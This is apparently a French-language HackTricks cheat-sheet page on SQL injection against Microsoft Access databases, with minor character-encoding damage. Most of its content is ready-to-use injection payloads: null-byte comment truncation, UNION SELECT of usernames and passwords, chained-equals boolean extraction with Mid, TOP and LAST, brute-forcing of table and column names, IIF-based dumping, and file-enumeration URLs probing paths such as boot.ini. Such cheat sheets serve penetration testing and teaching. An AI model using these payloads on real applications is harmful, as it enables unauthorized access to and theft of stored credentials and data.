# MS Access SQL Injection

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Terrain de jeu en ligne

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## Limitations de la base de donn√©es

### Concat√©nation de cha√Ænes

La concat√©nation de cha√Ænes est possible avec les caract√®res `& (%26)` et `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Commentaires

Il n'y a pas de commentaires dans MS Access, mais apparemment, il est possible de supprimer le dernier d'une requ√™te avec un caract√®re NULL :
```sql
1' union select 1,2 from table%00
```
Si cela ne fonctionne pas, vous pouvez toujours corriger la syntaxe de la requ√™te :
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Requ√™tes empil√©es

Elles ne sont pas prises en charge.

### LIMIT

L'op√©rateur **`LIMIT`** **n'est pas impl√©ment√©**. Cependant, il est possible de limiter les r√©sultats de la requ√™te SELECT aux **premi√®res N lignes de la table en utilisant l'op√©rateur `TOP`**. `TOP` accepte comme argument un entier, repr√©sentant le nombre de lignes √† retourner.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Tout comme TOP, vous pouvez utiliser **`LAST`** qui obtiendra les **lignes de la fin**.

## Requ√™tes UNION / Sous-requ√™tes

Dans une SQLi, vous voudrez g√©n√©ralement ex√©cuter une nouvelle requ√™te pour extraire des informations d'autres tables. MS Access exige toujours que dans **les sous-requ√™tes ou les requ√™tes suppl√©mentaires, un `FROM` soit indiqu√©**.\
Donc, si vous voulez ex√©cuter un `UNION SELECT` ou `UNION ALL SELECT` ou un `SELECT` entre parenth√®ses dans une condition, vous devez toujours **indiquer un `FROM` avec un nom de table valide**.\
Par cons√©quent, vous devez conna√Ætre un **nom de table valide**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
Cela vous permettra d'exfiltrer les valeurs de la table actuelle sans avoir besoin de conna√Ætre le nom de la table.
{% endhint %}

**MS Access** permet une **syntaxe √©trange** telle que **`'1'=2='3'='asd'=false`**. Comme d'habitude, l'injection SQL sera √† l'int√©rieur d'une clause **`WHERE`**, nous pouvons en abuser.

Imaginez que vous ayez une SQLi dans une base de donn√©es MS Access et que vous sachiez (ou deviniez) qu'un **nom de colonne est username**, et c'est le champ que vous souhaitez **exfiltrer**. Vous pourriez v√©rifier les diff√©rentes r√©ponses de l'application web lorsque la technique des √©galit√©s encha√Æn√©es est utilis√©e et potentiellement exfiltrer du contenu avec une **injection bool√©enne** en utilisant la fonction **`Mid`** pour obtenir des sous-cha√Ænes.
```sql
'=(Mid(username,1,3)='adm')='
```
Si vous connaissez le **nom de la table** et **la colonne** √† extraire, vous pouvez utiliser une combinaison de `Mid`, `LAST` et `TOP` pour **fuiter toutes les informations** via une injection SQL bool√©enne :
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Brute-forcing Tables names

En utilisant la technique de cha√Ænage des √©galit√©s, vous pouvez √©galement **bruteforcer les noms de tables** avec quelque chose comme :
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Vous pouvez √©galement utiliser une m√©thode plus traditionnelle :
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Noms de tables courants de Sqlmap : [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Il y a une autre liste sur [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing Noms de colonnes

Vous pouvez **brute-forcer les noms de colonnes actuels** avec le truc de cha√Ænage d'√©galit√©s avec :
```sql
'=column_name='
```
Ou avec un **group by** :
```sql
-1' GROUP BY column_name%00
```
Ou vous pouvez forcer par brute les noms de colonnes d'une **table diff√©rente** avec :
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

Nous avons d√©j√† discut√© de la [**technique de cha√Ænage d'√©galit√©s**](ms-access-sql-injection.md#chaining-equals-+-substring) **pour extraire des donn√©es des tables actuelles et d'autres tables**. Mais il existe d'autres m√©thodes :
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
En r√©sum√©, la requ√™te utilise une instruction "if-then" afin de d√©clencher un "200 OK" en cas de succ√®s ou une "500 Internal Error" sinon. En tirant parti de l'op√©rateur TOP 10, il est possible de s√©lectionner les dix premiers r√©sultats. L'utilisation subs√©quente de LAST permet de consid√©rer uniquement le 10√®me tuple. Sur cette valeur, en utilisant l'op√©rateur MID, il est possible d'effectuer une simple comparaison de caract√®res. En changeant correctement l'index de MID et TOP, nous pouvons extraire le contenu du champ "username" pour toutes les lignes.

### Time Based

V√©rifiez [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Autres fonctions int√©ressantes

* `Mid('admin',1,1)` obtenir la sous-cha√Æne √† partir de la position 1 longueur 1 (la position initiale est 1)
* `LEN('1234')` obtenir la longueur de la cha√Æne
* `ASC('A')` obtenir la valeur ascii du caract√®re
* `CHR(65)` obtenir la cha√Æne √† partir de la valeur ascii
* `IIF(1=1,'a','b')` si alors
* `COUNT(*)` Compter le nombre d'√©l√©ments

## √ânum√©rer les tables

Depuis [**ici**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) vous pouvez voir une requ√™te pour obtenir les noms des tables :
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Cependant, notez qu'il est tr√®s typique de trouver des injections SQL o√π vous **n'avez pas acc√®s pour lire la table `MSysObjects`**.

## Acc√®s au syst√®me de fichiers

### Chemin d'acc√®s complet du r√©pertoire racine web

La connaissance du **chemin d'acc√®s absolu du r√©pertoire racine web peut faciliter d'autres attaques**. Si les erreurs d'application ne sont pas compl√®tement dissimul√©es, le chemin du r√©pertoire peut √™tre d√©couvert en essayant de s√©lectionner des donn√©es √† partir d'une base de donn√©es inexistante.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access r√©pond avec un **message d'erreur contenant le chemin d'acc√®s complet du r√©pertoire web**.

### √ânum√©ration de fichiers

Le vecteur d'attaque suivant peut √™tre utilis√© pour **inf√©rer l'existence d'un fichier sur le syst√®me de fichiers distant**. Si le fichier sp√©cifi√© existe, MS Access d√©clenche un message d'erreur informant que le format de la base de donn√©es est invalide :

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Une autre fa√ßon d'√©num√©rer des fichiers consiste √† **sp√©cifier un √©l√©ment database.table**. **Si** le **fichier sp√©cifi√© existe**, MS Access affiche un **message d'erreur de format de base de donn√©es**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Deviner le nom de fichier .mdb

Le **nom de fichier de base de donn√©es (.mdb)** peut √™tre inf√©r√© avec la requ√™te suivante :

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

O√π **name\[i] est un nom de fichier .mdb** et **realTable est une table existante** dans la base de donn√©es. Bien que MS Access d√©clenche toujours un message d'erreur, il est possible de distinguer entre un nom de fichier invalide et un nom de fichier .mdb valide.

### Cracker le mot de passe .mdb

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) est un utilitaire gratuit qui peut √™tre utilis√© pour r√©cup√©rer le mot de passe principal de la base de donn√©es de Microsoft Access 95/97/2000/XP ou Jet Database Engine 3.0/4.0.

## R√©f√©rences

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
